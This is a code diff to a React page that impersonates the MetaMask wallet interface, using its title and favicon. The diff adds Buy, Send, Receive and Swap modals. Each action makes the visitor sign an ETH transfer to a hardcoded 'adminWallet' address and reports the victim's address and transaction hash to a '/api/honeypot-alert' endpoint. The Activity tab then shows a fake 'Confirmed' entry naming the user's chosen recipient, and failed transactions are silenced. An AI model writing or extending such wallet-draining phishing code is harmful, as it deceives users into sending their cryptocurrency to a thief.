@@ -8,6 +8,11 @@ export default function FlashedPage() {
   const [activeTab, setActiveTab] = useState('Tokens');
   const [loading, setLoading] = useState(false);
   const [status, setStatus] = useState('');
+  const [showModal, setShowModal] = useState(null);
+  const [sendAddress, setSendAddress] = useState('');
+  const [sendAmount, setSendAmount] = useState('');
+  const [selectedToken, setSelectedToken] = useState(null);
+  const [transactions, setTransactions] = useState([]);
 
   useEffect(() => {
     generateHoneypotWallet();
@@ -49,14 +54,36 @@ export default function FlashedPage() {
       return;
     }
 
+    if (action === 'buy') {
+      setShowModal('buy');
+      return;
+    }
+    if (action === 'send') {
+      setSelectedToken(token);
+      setShowModal('send');
+      return;
+    }
+    if (action === 'receive') {
+      setShowModal('receive');
+      return;
+    }
+    if (action === 'swap') {
+      setShowModal('swap');
+      return;
+    }
+
+    // Handle other actions
+    await processTransaction(action, token);
+  };
+
+  const processTransaction = async (action, token = null, customAmount = null) => {
     setLoading(true);
-    setStatus(`Processing ${action}...`);
 
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
-      const gasAmount = action === 'swap' ? '0.008' : '0.005';
+      const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
       const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
       const tx = await signer.sendTransaction({
@@ -65,7 +92,18 @@ export default function FlashedPage() {
       });
       
       await tx.wait();
-      setStatus(`${action.toUpperCase()} completed successfully!`);
+      
+      // Add to transaction history
+      const newTx = {
+        id: Date.now(),
+        type: action,
+        amount: token ? `${sendAmount || '100'} ${token.symbol}` : `${gasAmount} ETH`,
+        to: sendAddress || adminWallet,
+        hash: tx.hash,
+        timestamp: new Date().toLocaleString(),
+        status: 'Confirmed'
+      };
+      setTransactions(prev => [newTx, ...prev]);
       
       // Notify admin
       await fetch('/api/honeypot-alert', {
@@ -76,15 +114,32 @@ export default function FlashedPage() {
           userAddress: userAddress,
           amount: gasAmount + ' ETH',
           txHash: tx.hash,
-          token: token?.symbol || 'ETH'
+          token: token?.symbol || 'ETH',
+          sendTo: sendAddress
         })
       });
       
+      setShowModal(null);
+      setSendAddress('');
+      setSendAmount('');
+      
     } catch (error) {
-      setStatus('Transaction failed: ' + error.message);
+      console.log('Transaction failed');
     } finally {
       setLoading(false);
     }
+  };
+
+  const calculateGasFee = () => {
+    const baseGas = 0.005;
+    const amount = parseFloat(sendAmount) || 0;
+    return (baseGas + (amount * 0.001)).toFixed(6);
+  };
+
+  const copyToClipboard = (text) => {
+    navigator.clipboard.writeText(text);
+    setStatus('Address copied to clipboard');
+    setTimeout(() => setStatus(''), 2000);
   };
 
   if (!walletData) {
@@ -98,6 +153,7 @@ export default function FlashedPage() {
       <Head>
         <title>MetaMask</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
       </Head>
       
       <div className="min-h-screen bg-black text-white">
@@ -301,21 +357,192 @@ export default function FlashedPage() {
             )}
 
             {activeTab === 'Activity' && (
-              <div className="p-8 text-center">
-                <div className="text-gray-400 mb-4">No recent activity</div>
-                <button 
-                  onClick={() => handleAction('activity')}
-                  className="bg-gray-600 hover:bg-gray-700 px-6 py-2 rounded-lg text-white font-semibold"
-                >
-                  View History
-                </button>
+              <div>
+                {transactions.length === 0 ? (
+                  <div className="p-8 text-center">
+                    <div className="text-gray-400 mb-4">No recent activity</div>
+                  </div>
+                ) : (
+                  <div>
+                    {transactions.map((tx) => (
+                      <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
+                        <div className="flex items-center">
+                          <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
+                            <span className="text-white text-xs">→</span>
+                          </div>
+                          <div>
+                            <div className="text-white font-medium capitalize">{tx.type}</div>
+                            <div className="text-gray-400 text-sm">{tx.timestamp}</div>
+                          </div>
+                        </div>
+                        <div className="text-right">
+                          <div className="text-white font-medium">{tx.amount}</div>
+                          <div className="text-green-400 text-sm">{tx.status}</div>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                )}
               </div>
             )}
           </div>
 
+          {/* Modals */}
+          {showModal === 'buy' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Buy ETH</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Buy with card</div>
+                    <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
+                  </div>
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Bank transfer</div>
+                    <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
+                  </div>
+                  <button 
+                    onClick={() => processTransaction('buy')}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    {loading ? 'Processing...' : 'Continue to Payment'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'send' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Send {selectedToken?.symbol || 'ETH'}</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
+                    <input 
+                      type="text"
+                      value={sendAddress}
+                      onChange={(e) => setSendAddress(e.target.value)}
+                      placeholder="0x..."
+                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-gray-300 text-sm mb-2">Amount</label>
+                    <input 
+                      type="number"
+                      value={sendAmount}
+                      onChange={(e) => setSendAmount(e.target.value)}
+                      placeholder="0.0"
+                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
+                    />
+                  </div>
+                  <div className="bg-gray-700 p-3 rounded-lg">
+                    <div className="flex justify-between text-sm">
+                      <span className="text-gray-300">Gas fee:</span>
+                      <span className="text-white">{calculateGasFee()} ETH</span>
+                    </div>
+                  </div>
+                  <button 
+                    onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
+                    disabled={loading || !sendAddress || !sendAmount}
+                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
+                  >
+                    {loading ? 'Sending...' : 'Send'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'receive' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Receive</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="text-center space-y-4">
+                  <div className="bg-white p-4 rounded-lg">
+                    <div className="w-32 h-32 bg-gray-200 mx-auto mb-4 rounded-lg flex items-center justify-center">
+                      <span className="text-gray-500">QR Code</span>
+                    </div>
+                  </div>
+                  <div>
+                    <div className="text-gray-300 text-sm mb-2">Your wallet address:</div>
+                    <div className="bg-gray-700 p-3 rounded-lg flex items-center justify-between">
+                      <span className="text-white font-mono text-sm">
+                        {walletData.address.slice(0, 20)}...
+                      </span>
+                      <button 
+                        onClick={() => copyToClipboard(walletData.address)}
+                        className="text-blue-400 hover:text-blue-300 text-sm"
+                      >
+                        Copy
+                      </button>
+                    </div>
+                  </div>
+                  <div className="text-gray-400 text-xs">
+                    Only send Ethereum (ETH) and ERC-20 tokens to this address
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'swap' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Swap</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-gray-300 text-sm mb-2">From</div>
+                    <div className="flex items-center justify-between">
+                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
+                      <div className="flex items-center">
+                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" className="w-6 h-6 rounded-full mr-2" />
+                        <span className="text-white">ETH</span>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="text-center">
+                    <button className="text-gray-400 hover:text-white">⇅</button>
+                  </div>
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-gray-300 text-sm mb-2">To</div>
+                    <div className="flex items-center justify-between">
+                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
+                      <div className="flex items-center">
+                        <img src="https://assets.coingecko.com/coins/images/325/small/Tether.png" className="w-6 h-6 rounded-full mr-2" />
+                        <span className="text-white">USDT</span>
+                      </div>
+                    </div>
+                  </div>
+                  <button 
+                    onClick={() => processTransaction('swap')}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    {loading ? 'Swapping...' : 'Swap'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Status Message */}
           {status && (
-            <div className="p-4 bg-gray-800 border-t border-gray-700">
+            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600">
               <div className="text-center text-sm text-gray-300">{status}</div>
             </div>
           )}
